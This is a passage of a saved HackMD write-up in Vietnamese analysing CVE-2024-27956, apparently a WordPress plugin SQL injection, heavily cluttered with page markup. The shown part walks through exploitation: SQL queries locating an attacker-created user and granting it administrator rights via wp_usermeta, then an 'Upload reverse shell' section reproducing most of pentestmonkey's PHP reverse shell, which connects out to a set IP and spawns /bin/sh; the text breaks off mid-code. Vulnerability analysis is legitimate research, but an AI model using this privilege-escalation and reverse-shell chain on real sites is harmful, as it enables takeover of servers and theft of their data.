text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/H1l7SD1GR.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="5238" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="207" data-endline="207" data-position="5290" data-size="0"><span data-position="5290" data-size="33">=&gt; User đã tồn tại trong hệ thống</span></p><h3 class="part" data-startline="209" data-endline="209" id="Xác-định-user-id" data-id="Xác-định-user-id"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#X%C3%A1c-%C4%91%E1%BB%8Bnh-user-id" title="Xác-định-user-id" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="5329" data-size="16">Xác định user id</span></h3><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="211" data-endline="213" data-infoprefix-length="4" data-position="5347"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap sql hljs"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `wp_users` <span class="hljs-keyword">WHERE</span> user_login<span class="hljs-operator">=</span><span class="hljs-string">'poc'</span> <span class="hljs-keyword">and</span> ID<span class="hljs-operator">=</span><span class="hljs-number">1</span>
</code></pre>
      </div><p class="part" data-startline="215" data-endline="215" data-position="5417" data-size="0"><span data-position="5417" data-size="22">Brute force giá trị ID</span></p><p class="part" data-startline="217" data-endline="217" data-position="5442" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="5442" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/SJbpSPJz0.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="5442" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="219" data-endline="219" data-position="5494" data-size="0"><span data-position="5494" data-size="13">Tìm được ID=2</span></p><h3 class="part" data-startline="221" data-endline="221" id="Thêm-quyền-admin-cho-user-vừa-tạo" data-id="Thêm-quyền-admin-cho-user-vừa-tạo"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Th%C3%AAm-quy%E1%BB%81n-admin-cho-user-v%E1%BB%ABa-t%E1%BA%A1o" title="Thêm-quyền-admin-cho-user-vừa-tạo" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="5513" data-size="33">Thêm quyền admin cho user vừa tạo</span></h3><p class="part" data-startline="223" data-endline="223" data-position="5548" data-size="0"><span data-position="5548" data-size="41">User vừa tạo hiện tại chưa được gán quyền</span></p><p class="part" data-startline="225" data-endline="225" data-position="5591" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="5591" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/SkCj8wkMC.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="5591" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="227" data-endline="227" data-position="5643" data-size="0"><span data-position="5643" data-size="57">Câu truy vấn để thêm quyền admin cho user dựa trên user_id</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="229" data-endline="231" data-infoprefix-length="4" data-position="5703"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="wrap sql hljs"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> wp_usermeta (user_id, meta_key, meta_value) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">'wp_capabilities'</span>, <span class="hljs-string">'a:1:{s:13:"administrator";b:1;}'</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">'wp_user_level'</span>, <span class="hljs-string">'10'</span>)
</code></pre>
      </div><p class="part" data-startline="233" data-endline="233" data-position="5865" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="5865" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/HkE-DPyzR.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="5865" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="235" data-endline="235" data-position="5917" data-size="0"><span data-position="5917" data-size="13">Kết quả user </span><code data-position="5931" data-size="3">poc</code><span data-position="5935" data-size="18"> đã có quyền admin</span></p><p class="part" data-startline="237" data-endline="237" data-position="5955" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="5955" data-size="50" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Phân tích CVE-2024-27956 - HackMD_files/B1qIPvyGR.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="5955" data-size="50" loading="lazy" style="width: auto; height: auto;"></span></p><h2 class="part" data-startline="239" data-endline="239" id="Upload-reverse-shell" data-id="Upload-reverse-shell"><a class="anchor hidden-xs" href="https://hackmd.io/@cheese00/r1hYa0hZA#Upload-reverse-shell" title="Upload-reverse-shell" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="6010" data-size="20">Upload reverse shell</span></h2><p class="part" data-startline="241" data-endline="241" data-position="6032" data-size="0"><span data-position="6032" data-size="22">PHP reverse shell của </span><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener"><span data-position="6055" data-size="13">pentestmonkey</span></a><span data-position="6155" data-size="1">:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="243" data-endline="433" data-infoprefix-length="4" data-position="6158"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="php hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span>
<span data-linenumber="33"></span>
<span data-linenumber="34"></span>
<span data-linenumber="35"></span>
<span data-linenumber="36"></span>
<span data-linenumber="37"></span>
<span data-linenumber="38"></span>
<span data-linenumber="39"></span>
<span data-linenumber="40"></span>
<span data-linenumber="41"></span>
<span data-linenumber="42"></span>
<span data-linenumber="43"></span>
<span data-linenumber="44"></span>
<span data-linenumber="45"></span>
<span data-linenumber="46"></span>
<span data-linenumber="47"></span>
<span data-linenumber="48"></span>
<span data-linenumber="49"></span>
<span data-linenumber="50"></span>
<span data-linenumber="51"></span>
<span data-linenumber="52"></span>
<span data-linenumber="53"></span>
<span data-linenumber="54"></span>
<span data-linenumber="55"></span>
<span data-linenumber="56"></span>
<span data-linenumber="57"></span>
<span data-linenumber="58"></span>
<span data-linenumber="59"></span>
<span data-linenumber="60"></span>
<span data-linenumber="61"></span>
<span data-linenumber="62"></span>
<span data-linenumber="63"></span>
<span data-linenumber="64"></span>
<span data-linenumber="65"></span>
<span data-linenumber="66"></span>
<span data-linenumber="67"></span>
<span data-linenumber="68"></span>
<span data-linenumber="69"></span>
<span data-linenumber="70"></span>
<span data-linenumber="71"></span>
<span data-linenumber="72"></span>
<span data-linenumber="73"></span>
<span data-linenumber="74"></span>
<span data-linenumber="75"></span>
<span data-linenumber="76"></span>
<span data-linenumber="77"></span>
<span data-linenumber="78"></span>
<span data-linenumber="79"></span>
<span data-linenumber="80"></span>
<span data-linenumber="81"></span>
<span data-linenumber="82"></span>
<span data-linenumber="83"></span>
<span data-linenumber="84"></span>
<span data-linenumber="85"></span>
<span data-linenumber="86"></span>
<span data-linenumber="87"></span>
<span data-linenumber="88"></span>
<span data-linenumber="89"></span>
<span data-linenumber="90"></span>
<span data-linenumber="91"></span>
<span data-linenumber="92"></span>
<span data-linenumber="93"></span>
<span data-linenumber="94"></span>
<span data-linenumber="95"></span>
<span data-linenumber="96"></span>
<span data-linenumber="97"></span>
<span data-linenumber="98"></span>
<span data-linenumber="99"></span>
<span data-linenumber="100"></span>
<span data-linenumber="101"></span>
<span data-linenumber="102"></span>
<span data-linenumber="103"></span>
<span data-linenumber="104"></span>
<span data-linenumber="105"></span>
<span data-linenumber="106"></span>
<span data-linenumber="107"></span>
<span data-linenumber="108"></span>
<span data-linenumber="109"></span>
<span data-linenumber="110"></span>
<span data-linenumber="111"></span>
<span data-linenumber="112"></span>
<span data-linenumber="113"></span>
<span data-linenumber="114"></span>
<span data-linenumber="115"></span>
<span data-linenumber="116"></span>
<span data-linenumber="117"></span>
<span data-linenumber="118"></span>
<span data-linenumber="119"></span>
<span data-linenumber="120"></span>
<span data-linenumber="121"></span>
<span data-linenumber="122"></span>
<span data-linenumber="123"></span>
<span data-linenumber="124"></span>
<span data-linenumber="125"></span>
<span data-linenumber="126"></span>
<span data-linenumber="127"></span>
<span data-linenumber="128"></span>
<span data-linenumber="129"></span>
<span data-linenumber="130"></span>
<span data-linenumber="131"></span>
<span data-linenumber="132"></span>
<span data-linenumber="133"></span>
<span data-linenumber="134"></span>
<span data-linenumber="135"></span>
<span data-linenumber="136"></span>
<span data-linenumber="137"></span>
<span data-linenumber="138"></span>
<span data-linenumber="139"></span>
<span data-linenumber="140"></span>
<span data-linenumber="141"></span>
<span data-linenumber="142"></span>
<span data-linenumber="143"></span>
<span data-linenumber="144"></span>
<span data-linenumber="145"></span>
<span data-linenumber="146"></span>
<span data-linenumber="147"></span>
<span data-linenumber="148"></span>
<span data-linenumber="149"></span>
<span data-linenumber="150"></span>
<span data-linenumber="151"></span>
<span data-linenumber="152"></span>
<span data-linenumber="153"></span>
<span data-linenumber="154"></span>
<span data-linenumber="155"></span>
<span data-linenumber="156"></span>
<span data-linenumber="157"></span>
<span data-linenumber="158"></span>
<span data-linenumber="159"></span>
<span data-linenumber="160"></span>
<span data-linenumber="161"></span>
<span data-linenumber="162"></span>
<span data-linenumber="163"></span>
<span data-linenumber="164"></span>
<span data-linenumber="165"></span>
<span data-linenumber="166"></span>
<span data-linenumber="167"></span>
<span data-linenumber="168"></span>
<span data-linenumber="169"></span>
<span data-linenumber="170"></span>
<span data-linenumber="171"></span>
<span data-linenumber="172"></span>
<span data-linenumber="173"></span>
<span data-linenumber="174"></span>
<span data-linenumber="175"></span>
<span data-linenumber="176"></span>
<span data-linenumber="177"></span>
<span data-linenumber="178"></span>
<span data-linenumber="179"></span>
<span data-linenumber="180"></span>
<span data-linenumber="181"></span>
<span data-linenumber="182"></span>
<span data-linenumber="183"></span>
<span data-linenumber="184"></span>
<span data-linenumber="185"></span>
<span data-linenumber="186"></span>
<span data-linenumber="187"></span>
<span data-linenumber="188"></span>
<span data-linenumber="189"></span></div><div class="code"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
<span class="hljs-comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span>
<span class="hljs-comment">// for any actions performed using this tool.  The author accepts no liability</span>
<span class="hljs-comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
<span class="hljs-comment">// do not use this tool.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// In all other respects the GPL version 2 applies:</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// This program is free software; you can redistribute it and/or modify</span>
<span class="hljs-comment">// it under the terms of the GNU General Public License version 2 as</span>
<span class="hljs-comment">// published by the Free Software Foundation.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// This program is distributed in the hope that it will be useful,</span>
<span class="hljs-comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="hljs-comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="hljs-comment">// GNU General Public License for more details.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// You should have received a copy of the GNU General Public License along</span>
<span class="hljs-comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span class="hljs-comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span>
<span class="hljs-comment">// for any actions performed using this tool.  If these terms are not acceptable to</span>
<span class="hljs-comment">// you, then do not use this tool.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// You are encouraged to send comments, improvements or suggestions to</span>
<span class="hljs-comment">// me at pentestmonkey@pentestmonkey.net</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// Description</span>
<span class="hljs-comment">// -----------</span>
<span class="hljs-comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span>
<span class="hljs-comment">// The recipient will be given a shell running as the current user (apache normally).</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// Limitations</span>
<span class="hljs-comment">// -----------</span>
<span class="hljs-comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span>
<span class="hljs-comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span>
<span class="hljs-comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// Usage</span>
<span class="hljs-comment">// -----</span>
<span class="hljs-comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>

set_time_limit (<span class="hljs-number">0</span>);
<span class="hljs-variable">$VERSION</span> = <span class="hljs-string">"1.0"</span>;
<span class="hljs-variable">$ip</span> = <span class="hljs-string">'127.0.0.1'</span>;  <span class="hljs-comment">// CHANGE THIS</span>
<span class="hljs-variable">$port</span> = <span class="hljs-number">1414</span>;       <span class="hljs-comment">// CHANGE THIS</span>
<span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;
<span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;
<span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;
<span class="hljs-variable">$shell</span> = <span class="hljs-string">'uname -a; w; id; /bin/sh -i'</span>;
<span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;
<span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;

<span class="hljs-comment">//</span>
<span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span>
<span class="hljs-comment">//</span>

<span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
<span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span>
<span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'pcntl_fork'</span>)) {
	<span class="hljs-comment">// Fork and have the parent process exit</span>
	<span class="hljs-variable">$pid</span> = pcntl_fork();
	
	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) {
		printit(<span class="hljs-string">"ERROR: Can't fork"</span>);
		<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
	}
	
	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) {
		<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span>
	}

	<span class="hljs-comment">// Make the current process a session leader</span>
	<span class="hljs-comment">// Will only succeed if we forked</span>
	<span class="hljs-keyword">if</span> (posix_setsid() == -<span class="hljs-number">1</span>) {
		printit(<span class="hljs-string">"Error: Can't setsid()"</span>);
		<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
	}

	<span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;
} <span class="hljs-keyword">else</span> {
	printit(<span class="hljs-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);
}

<span class="hljs-comment">// Change to a safe directory</span>
chdir(<span class="hljs-string">"/"</span>);

<span class="hljs-comment">// Remove any umask we inherited</span>
umask(<span class="hljs-number">0</span>);

<span class="hljs-comment">//</span>
<span class="hljs-comment">// Do the reverse shell...</span>
<span class="hljs-comment">//</span>

<span class="hljs-comment">// Open reverse connection</span>
<span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);
<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) {
	printit(<span class="hljs-string">"<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)"</span>);
	<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-comment">// Spawn shell process</span>
<span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(
   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span>
   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span>
   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span>
);

<span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);

<span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) {
	printit(<span class="hljs-string">"ERROR: Can't spawn shell"</span>);
	<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-comment">// Set everything to non-blocking</span>
<span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);
stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);
stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);
stream_set_blocking(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);

printit(<span class="hljs-string">"Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>"</span>);

<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
	<span class="hljs-comment">// Check for end of TCP connection</span>
	<span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) {
		printit(<span class="hljs-string">"ERROR: Shell connection terminated"</span>);
		<span class="hljs-keyword">break</span>;
	}

	<span class="hljs-comment">// Check for end of STDOUT</span>
	<span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) {
		printit(<span class="hljs-string">"ERROR: Shell process terminated"</span>);
		<span class="hljs-keyword">break</span>;
	}

	<span class="hljs-comment">// Wait until a command is end down $sock, or some</span>
	<span class="hljs-comment">// command output is available on STDOUT or STDERR</span>
	<span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);
	<span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);

	<span class="hljs-comment">// If we can read from the TCP socket, send</span>
